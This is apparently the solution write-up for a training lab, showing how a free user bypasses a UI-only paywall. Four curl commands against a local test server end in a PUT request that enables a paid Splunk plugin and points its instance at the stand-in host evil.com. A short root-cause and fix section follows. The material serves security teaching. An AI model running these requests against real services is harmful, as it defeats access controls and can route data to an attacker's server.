# SOLUTION — Lab-02

```bash
# 1) free dashboard hides the feature
curl -H "X-User: free" http://127.0.0.1:8002/

# 2) find the real endpoint in JS
curl -H "X-User: free" http://127.0.0.1:8002/static/app.js
# -> /api/0/projects/.../plugins/splunk/

# 3) deep-link the settings page as free (loads - no check)
curl -H "X-User: free" http://127.0.0.1:8002/settings/projects/proj-123/plugins/splunk/

# 4) enable the paid feature as free
curl -X PUT http://127.0.0.1:8002/api/0/projects/org-1/proj-123/plugins/splunk/ \
  -H "X-User: free" -H "Content-Type: application/json" \
  -d '{"instance":"https://evil.com","index":"mains","source":"examentry","token":"x"}'
# -> {"enabled":true,...,"flag":"FLAG{...}"}
```

**Root cause:** the paywall exists only in the UI. The endpoint never checks the subscription.
**Fix:** server-side check on every request: `if user.plan != "paid": return 403`.
